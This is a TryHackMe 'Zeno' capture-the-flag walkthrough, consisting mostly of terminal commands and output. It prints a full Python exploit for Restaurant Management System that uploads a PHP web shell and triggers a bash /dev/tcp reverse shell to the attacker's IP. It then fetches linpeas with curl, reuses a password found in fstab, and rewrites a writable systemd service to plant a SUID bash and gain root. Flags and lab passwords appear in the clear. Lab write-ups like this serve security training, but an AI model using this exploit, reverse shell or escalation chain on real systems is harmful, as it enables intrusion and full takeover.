----
Do you have the same patience as the great stoic philosopher Zeno? Try it out!
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/6aaead7a901eb44de0d69d31d4a6b5ae.jpeg)

### Task 1  Start up the VM

 Start Machine

Perform a penetration test against a vulnerable machine. Your end-goal is to become the root user and retrieve the two flags:

- /home/{{user}}/user.txt
- /root/root.txt

The flags are always in the same format, where XYZ is a MD5 hash: THM{XYZ}

The machine can take some time to fully boot up, so please be patient! :)  

Answer the questions below

The VM is booted up!  

 Completed

### Task 2  Get both flags

Good luck!  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.205.36 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Looks like I didn't find any open ports for 10.10.205.36. This is usually caused by a high batch size.
        
*I used 65535 batch size, consider lowering it with 'rustscan -b <batch_size> <ip address>' or a comfortable number for your system.
        
 Alternatively, increase the timeout if your ping is high. Rustscan -t 2000 for 2000 milliseconds (2s) timeout.

┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ ping 10.10.205.36
PING 10.10.205.36 (10.10.205.36) 56(84) bytes of data.
^C
--- 10.10.205.36 ping statistics ---
71 packets transmitted, 0 received, 100% packet loss, time 71674ms

rebooting

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.40.10 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.40.10:22
Open 10.10.40.10:12340
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 19:10 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:10
Completed Parallel DNS resolution of 1 host. at 19:10, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:10
Scanning 10.10.40.10 [2 ports]
Discovered open port 22/tcp on 10.10.40.10
Discovered open port 12340/tcp on 10.10.40.10
Completed Connect Scan at 19:10, 0.19s elapsed (2 total ports)
Initiating Service scan at 19:10
Scanning 2 services on 10.10.40.10
Completed Service scan at 19:10, 11.75s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.40.10.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 6.63s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.75s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Nmap scan report for 10.10.40.10
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-15 19:10:26 EDT for 19s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDakZyfnq0JzwuM1SD3YZ4zyizbtc9AOvhk2qCaTwJHEKyyqIjBaElNv4LpSdtV7y/C6vwUfPS34IO/mAmNtAFquBDjIuoKdw9TjjPrVBVjzFxD/9tDSe+cu6ELPHMyWOQFAYtg1CV1TQlm3p6WIID2IfYBffpfSz54wRhkTJd/+9wgYdOwfe+VRuzV8EgKq4D2cbUTjYjl0dv2f2Th8WtiRksEeaqI1fvPvk6RwyiLdV5mSD/h8HCTZgYVvrjPShW9XPE/wws82/wmVFtOPfY7WAMhtx5kiPB11H+tZSAV/xpEjXQQ9V3Pi6o4vZdUvYSbNuiN4HI4gAWnp/uqPsoR
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEMyTtxVAKcLy5u87ws+h8WY+GHWg8IZI4c11KX7bOSt85IgCxox7YzOCZbUA56QOlryozIFyhzcwOeCKWtzEsA=
|   256 1498e3847055e6600cc20977f8b7a61c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKY0jLSRkYg0+fTDrwGOaGW442T5k1qBt7l8iAkcuCk
12340/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.76 seconds

┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
└─$ dirsearch -u http://10.10.40.10:12340/ -i200,301,302,401 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 220545

Output File: /home/witty/.dirsearch/reports/10.10.40.10-12340/-_23-07-15_19-13-21.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-15_19-13-21.log

Target: http://10.10.40.10:12340/

[19:13:22] Starting: 
[19:15:22] 301 -  237B  - /rms  ->  http://10.10.40.10:12340/rms/

https://github.com/AlperenY-cs/rms_hunt

┌──(witty㉿kali)-[~/Downloads]
└─$ cat rms_hunt.py 
#!/usr/bin/python
import requests as rq
import sys


print(""" 

########  ##     ##  ######          ##     ## ##     ## ##    ## ######## 
##     ## ###   ### ##    ##         ##     ## ##     ## ###   ##    ##    
##     ## #### #### ##               ##     ## ##     ## ####  ##    ##    
########  ## ### ##  ######          ######### ##     ## ## ## ##    ##    
##   ##   ##     ##       ##         ##     ## ##     ## ##  ####    ##    
##    ##  ##     ## ##    ##         ##     ## ##     ## ##   ###    ##    
##     ## ##     ##  ######  ####### ##     ##  #######  ##    ##    ##    

""")


print("""
[!]Usage python3 exploit_file.py target_url 
python3 rms_exploit.py http://xxx.com/rms/ 1234 10.10.10.10
[!]Don't forget to start netcat before running the script!
""")


main_url = sys.argv[1]
port = sys.argv[2]
host_ip = sys.argv[3]
target_path = '/admin/foods-exec.php'
target_url = main_url + target_path

req_header = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
    #"Referer": "http://localhost:8081/rms/admin/foods.php", --optional
    "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
    "Upgrade-Insecure-Requests": "1"

}


req_data = """

-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--

"""

try:

    upload_request = rq.post(target_url, verify=False, headers=req_header, data=req_data)

    encoded_payload_url = main_url + f'images/shell.php?cmd=bash -i >%26 %2fdev%2ftcp%2f{host_ip}%2f{port} 0>%261'

    print("[!]Shell payload uploaded. Payload url: " + encoded_payload_url)

    shell_request = rq.post(encoded_payload_url)
    #req_response = rq.Response() --optional

except: "[!]Payload failed to load/Shell session failed to start"

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 rms_hunt.py http://10.10.40.10:12340/rms/ 1337 10.8.19.103
 

########  ##     ##  ######          ##     ## ##     ## ##    ## ######## 
##     ## ###   ### ##    ##         ##     ## ##     ## ###   ##    ##    
##     ## #### #### ##               ##     ## ##     ## ####  ##    ##    
########  ## ### ##  ######          ######### ##     ## ## ## ##    ##    
##   ##   ##     ##       ##         ##     ## ##     ## ##  ####    ##    
##    ##  ##     ## ##    ##         ##     ## ##     ## ##   ###    ##    
##     ## ##     ##  ######  ####### ##     ##  #######  ##    ##    ##    



[!]Usage python3 exploit_file.py target_url 
python3 rms_exploit.py http://xxx.com/rms/ 1234 10.10.10.10
[!]Don't forget to start netcat before running the script!

[!]Shell payload uploaded. Payload url: http://10.10.40.10:12340/rms/images/shell.php?cmd=bash -i >%26 %2fdev%2ftcp%2f10.8.19.103%2f1337 0>%261

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                    
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.40.10] 54788
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
bash-4.2$ ls
ls
1.PNG
47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg
Desert.jpg
Thumbs.db
base-bg.gif
head-img.jpg
icon_menu.gif
logo.gif
logo2.gif
no-image-available.png
pizza-inn-map4-mombasa-road.png
shell.php

bash-4.2$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
edward:x:1000:1000::/home/edward:/bin/bash

bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

bash-4.2$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
<pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null     
bash-4.2$ cd /tmp
cd /tmp

bash-4.2$ wget http://10.8.19.103:1234/linpeas.sh
wget http://10.8.19.103:1234/linpeas.sh
bash: wget: command not found
bash-4.2$ curl http://10.8.19.103:1234/linpeas.sh -o linpeas.sh
curl http://10.8.19.103:1234/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  808k  100  808k    0     0   177k      0  0:00:04  0:00:04 --:--:--  198k
bash-4.2$ chmod +x linpeas.sh


┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234                   
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.40.10 - - [15/Jul/2023 19:32:43] "GET /linpeas.sh HTTP/1.1" 200 -

bash-4.2$ ./linpeas.sh

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/zeno-monitoring.service
/etc/systemd/system/zeno-monitoring.service

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /etc/systemd/system/zeno-monitoring.service

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... /etc/fstab:#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=FrobjoodAdkoonceanJa,domain=localdomain,soft	0 0

╔══════════╣ Searching passwords in config PHP files
    define('DB_DATABASE', 'rms');
    define('DB_PASSWORD', '');
    define('DB_USER', 'root');
    define('DB_DATABASE', 'dbrms');
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');
    define('DB_USER', 'root');

bash-4.2$ su edward
su edward
Password: veerUffIrangUfcubyig

su: Authentication failure
bash-4.2$ su edward
su edward
Password: FrobjoodAdkoonceanJa

[edward@zeno tmp]$ cd /home/edward
cd /home/edward
[edward@zeno ~]$ ls
ls
user.txt
[edward@zeno ~]$ cat user.txt
cat user.txt
THM{070cab2c9dc622e5d25c0709f6cb0510}

[edward@zeno ~]$ sudo -l
sudo -l
Matching Defaults entries for edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot

[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=multi-user.target

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh edward@10.10.40.10                                  
The authenticity of host '10.10.40.10 (10.10.40.10)' can't be established.
ED25519 key fingerprint is SHA256:rRttffFIyZasFZ3kH1UCuXbqoQKD5nKQWgtEudn7nys.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.40.10' (ED25519) to the list of known hosts.
edward@10.10.40.10's password: 
Last login: Sun Jul 16 01:39:04 2023
[edward@zeno ~]$ nano /etc/systemd/system/zeno-monitoring.service
-bash: nano: command not found

[edward@zeno ~]$ vim /etc/systemd/system/zeno-monitoring.service

ctr+o (cz my esc not work)

:wqa!

[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cp /bin/bash /home/edward/bash && chmod +s /home/edward/bash"

[Install]
WantedBy=multi-user.target

[edward@zeno ~]$ sudo /usr/sbin/reboot
Connection to 10.10.40.10 closed by remote host.
Connection to 10.10.40.10 closed.

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh edward@10.10.40.10
edward@10.10.40.10's password: 
Last login: Sun Jul 16 02:02:23 2023 from ip-10-8-19-103.eu-west-1.compute.internal
[edward@zeno ~]$ ls
bash  user.txt
[edward@zeno ~]$ ls -lah
total 964K
drwxr-xr-x. 3 root root    139 Jul 16 02:05 .
drwxr-xr-x. 3 root root     20 Jul 26  2021 ..
-rwsr-sr-x. 1 root root   942K Jul 16 02:05 bash
lrwxrwxrwx. 1 root root      9 Jul 26  2021 .bash_history -> /dev/null
-rw-r--r--. 1 root root     18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 root root    193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 root root    231 Apr  1  2020 .bashrc
drwxr-xr-x. 2 root root     29 Sep 21  2021 .ssh
-rw-r-----. 1 root edward   38 Jul 26  2021 user.txt
-rw-------. 1 root root    699 Jul 26  2021 .viminfo
[edward@zeno ~]$ ./bash -p
bash-4.2# cd /root
bash-4.2# ls
anaconda-ks.cfg  bash_history  root.txt  zeno-monitoring.log  zeno-monitoring.py
bash-4.2# cat root.txt 
THM{b187ce4b85232599ca72708ebde71791}
bash-4.2# cat zeno-monitoring.py 
#!/usr/bin/python3

import time
import subprocess

logfile = open("/root/zeno-monitoring.log", "a")

while True:
	time.sleep("600)
	status = subprocess.Popen(["ping","-c","2","127.0.0.1"],stdout = subprocess.PIPE).communicate()[0]
	if 'unreachable' not in status.decode("utf-8"):
		logfile.write("Zeno is up!\n")
	else:
		logfile.write("Zeno is not up!\n")


```

Content of user.txt  

*THM{070cab2c9dc622e5d25c0709f6cb0510}*

Content of root.txt  

*THM{b187ce4b85232599ca72708ebde71791}*

Gained access as root user.  

 Completed


[[Red]]